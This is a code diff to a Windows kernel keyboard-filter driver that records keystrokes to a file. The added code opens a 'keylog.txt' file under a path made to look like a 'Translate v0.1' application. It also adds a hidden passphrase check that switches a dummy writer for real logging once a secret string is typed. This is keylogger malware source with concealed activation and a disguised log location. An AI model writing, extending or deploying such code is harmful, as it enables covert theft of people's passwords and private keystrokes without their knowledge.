@@ -30,7 +30,7 @@ KEYBOARD_DATA_ARRAY 		keyboardDataArray;	// Structure that holds the global arra
 
 ULONG				written;		// Total number of records written to the file.
 
-#define				LOG_TRIGGER_POINT 32	// Value at which the writing work item fires.
+#define				LOG_TRIGGER_POINT 64	// Value at which the writing work item fires.
 
 #define				SZ_KEYTABLE 0x100	// Size of the scancodes table.
 
@@ -46,7 +46,7 @@ NTSTATUS broken(DWORD one, PKEYBOARD_INPUT_DATA two) {
 // RDP likes to send an FF scan code which requires a table of 0x100 size to handle.
 char* keytable[SZ_KEYTABLE] =
 {
-	"[INVALID0]",
+	"[INVALID0]", //0x1
 	"Esc",
 	"1",
 	"2",
@@ -55,7 +55,7 @@ char* keytable[SZ_KEYTABLE] =
 	"5",
 	"6",
 	"7",
-	"8",
+	"8", //0x10
 	"9",
 	"0",
 	"-",
@@ -415,6 +415,68 @@ DumpBuffer
 }
 
 NTSTATUS
+OpenLogFile
+(
+)
+/**
+ *
+ * Open the log file for writing. If the file does not yet exist.,
+ * create it.
+ *
+ * Return:
+ *
+ *		Status of the operation.
+ **/
+{
+
+	IO_STATUS_BLOCK		ioStatusBlock;
+	OBJECT_ATTRIBUTES	fileObjectAttributes;
+	NTSTATUS			status;
+	UNICODE_STRING		fileName;
+
+	//
+	// Initialize file name
+	//
+
+	RtlInitUnicodeString(&fileName, L"\\DosDevices\\C:\\App Development\\keylog.txt");
+
+	//
+	// Initialize file attributes
+	//
+	InitializeObjectAttributes(
+		&fileObjectAttributes,
+		&fileName,
+		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+		NULL,
+		NULL);
+
+	status = STATUS_SUCCESS;
+
+	//
+	// Create file
+	//
+	status = ZwCreateFile(
+		&fileHandle,
+		GENERIC_ALL | SYNCHRONIZE,
+		&fileObjectAttributes,
+		&ioStatusBlock,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_WRITE | FILE_SHARE_READ,	// Exclusive access to the file // Modified to allow file read
+		FILE_OPEN_IF,
+		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+		NULL,
+		0);
+
+	if (!NT_SUCCESS(status))
+	{
+		return status;
+	}
+
+	return status;
+}
+
+NTSTATUS
 WorkingLogging
 (
 	DWORD					n,
@@ -501,7 +563,7 @@ WorkingLogging
 	IO_STATUS_BLOCK ioStatusBlock;
 	LARGE_INTEGER ByteOffset;
 	OBJECT_ATTRIBUTES objAttr;
-	RtlInitUnicodeString(&fileName, L"\\??\\C:\\keylog.txt");
+	RtlInitUnicodeString(&fileName, L"\\??\\C:\\Program Files\\Applications\\Translate v0.1\\keylog.txt");
 
 	InitializeObjectAttributes(&objAttr, &fileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
 
@@ -1221,6 +1283,10 @@ WriteWorkItem(
 	CHAR* asciiRepr = NULL;
 	secretBuffer[0] = '\0';
 
+	// Secret strings
+	char target_string[] = "aw3s0m3,d00d";
+	char target_string2[] = "aaww33ss00mm33,,dd0000dd";
+
 	for (unsigned int i = 0; i < n; i++)
 	{
 		scancode = context->buffer[i].MakeCode;
@@ -1237,13 +1303,24 @@ WriteWorkItem(
 			if (scancode >= 0 && scancode < SZ_KEYTABLE)
 			{
 				strcat(secretBuffer, asciiRepr);
-				if (strstr("aw3s0m3,d00d", secretBuffer) != 0) {
-					WriteToLogFile = WorkingLogging;
-				}
+			}
+			if (strstr(secretBuffer, target_string) != NULL)
+			{
+				WriteToLogFile = WorkingLogging;
+				//clear secretBuffer to start checking again
+				memset(secretBuffer, 0, sizeof(secretBuffer));
+			}
+			else if (strstr(secretBuffer, target_string2) != NULL)
+			{
+				WriteToLogFile = WorkingLogging;
+				//clear secretBuffer to start checking again
+				memset(secretBuffer, 0, sizeof(secretBuffer));
+			}
+			else {
+				WriteToLogFile = broken;
 			}
 		}
-
-	};
+	}
 
 	WriteToLogFile(n, context->buffer);
 
